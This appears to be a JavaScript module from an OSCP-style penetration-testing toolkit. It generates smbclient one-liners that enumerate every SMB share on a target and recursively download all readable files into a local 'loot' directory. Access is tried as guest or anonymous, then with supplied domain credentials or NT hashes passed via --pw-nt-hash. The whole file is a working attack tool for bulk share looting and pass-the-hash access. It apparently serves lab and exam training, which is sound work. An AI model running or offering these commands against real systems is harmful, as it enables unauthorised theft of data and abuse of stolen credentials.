const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

const identityFolder = (domain, username) => {
  const identity = [domain, username].filter(Boolean).join("_") || "account";
  return identity.replace(/[^a-zA-Z0-9._@-]+/g, "_").replace(/^_+|_+$/g, "") || "account";
};

const downloadBody = ({ folder, listCommand, downloadCommand }) => [
  `root="$HOME/oscp/{{targetName}}/loot/smb/${folder}";`,
  'mkdir -p "$root";',
  listCommand,
  "| awk -F'|' '$1 == \"Disk\" {print $2}'",
  "| while IFS= read -r share; do",
  '[ -z "$share" ] && continue;',
  'echo "[*] Downloading as ' + folder + ': $share";',
  'mkdir -p "$root/$share";',
  `(cd "$root/$share" && ${downloadCommand});`,
  "done;",
  'find "$root" -mindepth 1 -type d -empty -delete 2>/dev/null;',
  'find "$root" -type f -printf "%p\\n"',
].join(" ");

export function buildSmbDownloadCommands(accounts = []) {
  const commands = [
    {
      key: "smb-download-guest",
      label: "Download every readable share — guest / anonymous",
      value: downloadBody({
        folder: "guest",
        listCommand: "{ smbclient -g -L '//{{rhost}}' -N 2>/dev/null || smbclient -g -L '//{{rhost}}' -U 'guest%' 2>/dev/null; }",
        downloadCommand: "{ smbclient \"//{{rhost}}/$share\" -N -c 'recurse ON; prompt OFF; mget *' || smbclient \"//{{rhost}}/$share\" -U 'guest%' -c 'recurse ON; prompt OFF; mget *'; }",
      }),
    },
  ];

  const seen = new Set();
  for (const account of accounts) {
    const username = account.username?.trim();
    const secret = account.secret?.trim();
    const domain = account.domain?.trim() ?? "";
    if (!username || !secret) continue;

    const dedupeKey = `${domain.toLowerCase()}\u0000${username.toLowerCase()}\u0000${secret}`;
    if (seen.has(dedupeKey)) continue;
    seen.add(dedupeKey);

    const principal = domain ? `${domain}/${username}` : username;
    const credential = shellQuote(`${principal}%${secret}`);
    const hashFlag = /^[a-f0-9]{32}$/i.test(secret) ? " --pw-nt-hash" : "";
    const folder = identityFolder(domain, username);

    commands.push({
      key: `smb-download-${account.id ?? folder}`,
      label: `Download every readable share — ${domain ? `${domain}\\` : ""}${username}`,
      value: downloadBody({
        folder,
        listCommand: `smbclient -g -L '//{{rhost}}' -U ${credential}${hashFlag} 2>/dev/null`,
        downloadCommand: `smbclient \"//{{rhost}}/$share\" -U ${credential}${hashFlag} -c 'recurse ON; prompt OFF; mget *'`,
      }),
    });
  }

  return commands;
}
